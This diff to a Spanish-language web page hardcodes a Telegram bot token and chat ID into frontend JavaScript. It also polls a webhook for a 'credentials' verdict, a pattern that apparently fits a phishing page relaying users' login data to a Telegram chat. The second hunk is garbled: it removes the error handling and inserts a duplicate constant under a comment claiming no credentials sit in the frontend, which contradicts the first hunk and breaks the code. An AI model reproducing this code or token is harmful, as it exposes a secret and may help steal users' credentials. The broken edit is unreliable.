@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -681,8 +682,8 @@
         // ============================================
         // CONFIGURACIÓN - ACTUALIZADO CON NUEVAS CREDENCIALES
         // ============================================
-        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+        const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
+        const TELEGRAM_CHAT_ID = '-1003713613246';
         const WEBHOOK_URL = '/api/webhook';
         const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000;
@@ -1029,9 +1030,9 @@
                     return;
                 } else if (resultado === 'error_credenciales') {
                     clearInterval(pollingInterval);
-                    pollingInterval = null;
-                    mostrarError('❌ Los datos ingresados no coinciden. Intente de nuevo.');
-                    resetFormulario();
+        
+        // ✅ SIN CREDENCIALES EN FRONTEND
+        const WEBHOOK_URL = '/api/webhook';
                     return;
                 }
             }, POLLING_INTERVAL);
